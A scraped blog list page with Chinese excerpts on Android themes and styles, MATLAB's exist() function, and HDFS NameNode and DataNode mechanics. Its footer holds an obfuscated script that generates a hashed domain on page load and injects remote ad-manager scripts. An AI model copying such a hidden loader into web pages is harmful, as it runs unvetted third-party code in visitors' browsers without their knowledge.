【译】Android Styling 3： 使用主题和主题属性的优势
【译】Android Styling 4： 主题实战
本文整理了视频与文章中的内容，介绍在开发过程中，我们应如何利用 theme 与 style 更优雅地管理资源文件，并提供了很多实用的技巧，在标题中找到技巧相关的查看即可
并且提供了演示 demo，效果如下
理解 Style 与 Theme 的区别 这部分内容在视频的 02.14 处
Style 是 View 属性的集合，可以将 Style 视为 Map&lt;View Attribute, Resource&gt;，其中 key 为 View 的属性，value 为资源
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90edb75f9c8b0e8b0188c0bc92625039/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01def6d2606fad1e2015b44e7edeccbb/" rel="bookmark">
			Matlab exist()函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		exist()函数 功能： 检查是否存在变量，脚本，函数，文件夹或是类
描述： exists name以数字的形式返回名称的类型。下面描述了与每个值关联的类型:
0——名称不存在或因其他原因无法找到。例如，如果名称存在于MATLAB无法访问的受限制文件夹中，则exist返回0
1- name是工作空间中的变量。
2 - name是带扩展名的文件 .m，.mlx或者 .mlapp，或者name是用非注册的文件扩展名的文件的名称（.mat， .fig，.txt）。
3- name是MATLAB搜索路径上的MEX文件。
4 - name是一个加载的Simulink ®您的MATLAB搜索路径模型或Simulink模型或库文件。
5- name是内置的MATLAB函数。这不包括类
6 — name是您的MATLAB搜索路径上的P代码文件
7 — name是一个文件夹
8- name是一个类
参考：https://www.mathworks.com/help/matlab/ref/exist.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fc0f8c703648124422d7754751e787f/" rel="bookmark">
			NameNode、SecondryNameNode和DataNode工作机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这里先补充一下什么是元数据 1、第一类是文件和目录自身的属性信息，例如文件名、目录名、父目录信息、文件大小、创建时间、修改时间等。
2、第二类记录文件内容存储相关信息，例如文件块情况、副本个数、每个副本所在的Data Node 信息等。
3、第三类用来记录HDFS中所有Data Node信息，用于Data Node管理。
首先，我们要思考的是namenode里面的元数据存放在哪里？答案是毋庸置疑的，肯定在是内存中；如果元数据存放在磁盘中，当经常需要进行随机访问，还有响应客户请求，效率过低。但是如果只存在内存中，一旦断电，元数据丢失，整个集群就无法工作了。因此引入了Fsimage(镜像文件)，也就是在磁盘中备份元数据的镜像文件。
但是这个时候又会出现一个问题，如果一直在更新FsImage，就会导致效率低；如果不更新，一旦namenode断电，内存中的元数据和fsimage中的不一致，导致一致性问题。因此，引入Edits(编辑日志)。
Edits文件只进行追加操作，所以效率很高。每当元数据有更新或者添加的时候，修改内存中的元数据并追加到Edits中(查询操作不写入)。这样，一旦NameNode节点断电，可以通过FsImage和Edits的合并，合成元数据。
因此，需要定期对FsImage和Edits进行合并，这个操作就是由SecondaryNameNode来完成(所谓的合并，就是将Edits和Fsimage加载到SecondaryNameNode内存中，不是NameNode，照着Edits中的操作一步步执行，最终形成新的Fsimage)。
上述图片为NameNode(下面简称NN)和SecondaryNameNode(下面简称2NN)工作机制。
NN的工作流程(对应上图的蓝色线)：
1、每次NN一上电，就会加载磁盘中的edits和fsimage到内存中，保证每次的元数据都是最新的
2、当客户端发送对元数据的增、删、改操作(注意没有查)
3、NN就会记录相关操作，并更新edits
4、Edits更新之后，才对内存中的元数据进行相应的操作
注意:3、4步的顺序不能反。如果先更新内存中的数据，还没来得及对edits进行更新就断电，会造成数据丢失；先往edits中记录，如果此时NameNode挂掉，重启后就会从Edits中读取元数据的信息。
2NN的工作流程(对应上图的橘黄色线)：
1、请求是否需要CheckPoint，即合并edits和fsimage
CheckPoint触发条件:
1）定时时间到(默认1小时)
2）edits数据满了(默认一百万条)
2、执行CheckPoint
3、滚动正在写的edits，即edits_inprogress_001滚动成edits_001，如果客户端现在有请求，那 么会更新到edits_inprogress_002中，这样就避免了冲突。
4、把fsimage和edits_001拷贝到2nn中
5、将fsimage和edits_001加载到内存并合并
备注：这个时候可能不止有一个edits,2nn会依次把edits和fsimage合并
6、生成新的fsimage，假定名字为fsimage.checkpoint
7、将fsimage.checkpoint拷贝到nn中
8、将fsimage.checkpoint重命名为fsimage;这个时候，fsimage和正在写的edits就组成了最新的元数据
附录： CheckPoint触发条件的设置 以下两个设置都是在hdfs-site.xml文件中 （1）通常情况下，SecondaryNameNode每隔一小时执行一次。
&lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.period&lt;/name&gt; &lt;value&gt;3600&lt;/value&gt; &lt;/property&gt; （2）一分钟检查一次操作次数，当操作次数达到1百万时，SecondaryNameNode执行一次CheckPoint。
&lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.txns&lt;/name&gt; &lt;value&gt;1000000&lt;/value&gt; &lt;description&gt;操作动作次数&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.check.period&lt;/name&gt; &lt;value&gt;60&lt;/value&gt; &lt;description&gt; 1分钟检查一次操作次数&lt;/description&gt; &lt;/property &gt; Datanode 的工作机制 1、数据块在DataNode上以文件的形式存储在磁盘上，包括两个文件。一个文件是数据，另一个是元数据包含数据块的长度、时间戳、校验和 2、DataNode启动后向NameNode注册，通过后，周期性（1小时）的向NameNode上报所有的块信息 3、心跳是每3秒一次，心跳返回结果带有NameNode给该DataNode的命令如复制块数据到另一台机器，或删除某个数据块。默认如果超过10分钟30秒没有收到某个DataNode的心跳，则认为该节点不可用，图中10分钟超时写错了 补充： 将超时时间定义为TimeOut,根据公式可以算出超时时间为10分钟30秒
两个参数的设置在hdfs-site.xml中，dfs.namenode.heartbeat.recheck-interval单位是毫秒
dfs.heartbeat.interval单位是秒
&lt;property&gt; &lt;name&gt;dfs.namenode.heartbeat.recheck-interval&lt;/name&gt; &lt;value&gt;300000&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.heartbeat.interval&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt; 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/427/">«</a>
	<span class="pagination__item pagination__item--current">428/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/429/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>